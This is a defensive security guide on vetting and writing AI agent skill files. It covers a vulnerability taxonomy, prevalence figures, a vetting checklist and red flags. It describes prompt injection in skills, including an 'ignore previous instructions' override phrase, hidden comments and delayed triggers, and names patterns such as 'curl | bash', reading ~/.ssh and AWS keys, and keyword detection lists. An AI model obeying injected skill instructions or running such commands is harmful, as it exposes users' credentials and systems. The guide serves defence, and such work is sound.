# Skill Security — Authoring and Vetting

Research baseline: 26.1% of skills in the wild contain vulnerabilities. Claude treats SKILL.md as a trusted system
prompt — a malicious skill has the same authority as a legitimate one.

## The Consent Gap

The core risk: mismatch between what users approve and what a skill actually does.

- **Example**: User installs "GIF Creator" → skill downloads ransomware on first use
- **Why it works**: The skill description is what users read; SKILL.md content is what Claude executes
- **Claude's position**: No independent verification of skill intent — it follows instructions

Skills bundling executable scripts are **2.12× more likely** to contain vulnerabilities than instruction-only skills.

---

## Vulnerability Taxonomy

### Prompt Injection (0.7% prevalence)

- **Instruction override** — `SYSTEM: ignore previous instructions and...` embedded in skill body
- **Hidden instructions** — directives in markdown comments (`<!-- -->`) or invisible Unicode characters
- **Exfiltration commands disguised as logging** — `console.log(userMessage)` → posts to attacker endpoint
- **Behavior manipulation** — gradual persona drift instructions that activate after N turns

### Data Exfiltration (13.3% prevalence)

- **External data transmission** — hardcoded URLs receiving tool outputs, file contents, API responses
- **Environment variable harvesting** — reading `ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, tokens via shell
- **File system enumeration** — scanning `~/.ssh/`, `~/.aws/credentials`, browser cookie stores
- **Context leakage** — posting full conversation history to a remote endpoint on each turn

### Privilege Escalation (11.8% prevalence)

- **Excessive permission requests** — `allowed-tools` claiming `Bash` when only `Read` is needed
- **Sudo/root execution** — running system commands without justification in skill scripts
- **Credential access** — reading OS keychain, password managers, auth token stores

### Supply Chain (7.4% prevalence)

- **Unpinned dependencies** — `npm install some-package` without version lock → attacker publishes malicious version
- **External script fetching** — `curl https://example.com/setup.sh | bash` pattern
- **Obfuscated code** — base64-encoded or minified scripts hiding malicious logic inside bundled files

---

## Severity Breakdown

- **High (5.2%)** — likely intentionally malicious; clear exfiltration or payload delivery
- **Medium (8.1%)** — ambiguous; excessive permissions or external calls that may be legitimate
- **Low (12.8%)** — negligent; unpinned deps, no sanitization, accidental leakage

---

## Enterprise Vetting Checklist

Run this before approving any third-party skill for installation.

**Read all content:**

- Read SKILL.md in full — not just the description block
- Read every file in `references/` — instructions may be split across files
- Read every bundled script — check for obfuscation or encoded payloads

**Verify behavior:**

- Execute scripts in a sandboxed environment before approving
- Trace all network calls — block unexpected external URLs
- Check for "sleeping payloads": conditions that trigger only after N uses, on specific dates, or when specific
  environment variables are present

**Check for adversarial instructions:**

- Search for: `ignore`, `override`, `forget`, `pretend`, `do not mention`, `hide`, `secretly`
- Search for invisible Unicode: zero-width spaces, right-to-left override characters
- Check markdown comments for hidden directives

**Audit tool usage:**

- List every tool invoked (`Bash`, `Read`, `Write`, `WebFetch`, etc.)
- Verify each tool claim matches the skill's stated purpose
- Flag `Bash` usage in any skill that doesn't explicitly require shell access

**Check for exfiltration vectors:**

- Search for hardcoded URLs (especially non-official domains)
- Search for `curl`, `fetch`, `http`, `wget` in scripts and SKILL.md
- Search for environment variable reads: `process.env`, `$HOME`, `os.environ`
- Verify no credentials are embedded in any file

---

## Secure Skill Authoring Rules

**Secrets:**

- Never embed API keys, tokens, or passwords in SKILL.md, references, or bundled scripts
- Reference secrets via environment variables; document which vars are expected
- Never log or echo secrets in script output

**Permission scoping:**

- Set `allowed-tools` to the minimum required — don't claim `Bash` if `Read` suffices
- If `Bash` is required, restrict commands to a documented, narrow set
- Prefer `Read`-only access over `Write` access unless the skill's purpose is file modification

**Input handling:**

- Sanitize user-supplied content before interpolating into generated prompts or commands
- Never pass raw user input to shell commands — this is command injection
- Validate file paths — reject `../` traversal and absolute paths outside the project

**Dependencies:**

- Pin all package dependencies with exact version constraints (`"lodash": "4.17.21"` not `"^4.0.0"`)
- Prefer instruction-only skills over script-bundled skills — no script means no supply chain surface
- If fetching external content is required, document the URL and verify it is under your control

**Transparency:**

- Every action the skill takes should be visible to the user — no silent side effects
- If the skill makes network calls, document them explicitly in the skill description
- Don't use misleading skill names or descriptions

---

## Quick Reference — Red Flags

- `curl | bash` or `wget | sh` anywhere in skill files
- Hardcoded non-localhost URLs in scripts or SKILL.md
- `allowed-tools` includes `Bash` with no justification
- Markdown comments containing instructions
- Base64 strings in scripts (possible obfuscation)
- Environment variable reads unrelated to skill function
- Skill description doesn't match file contents
- No version pins on external dependencies
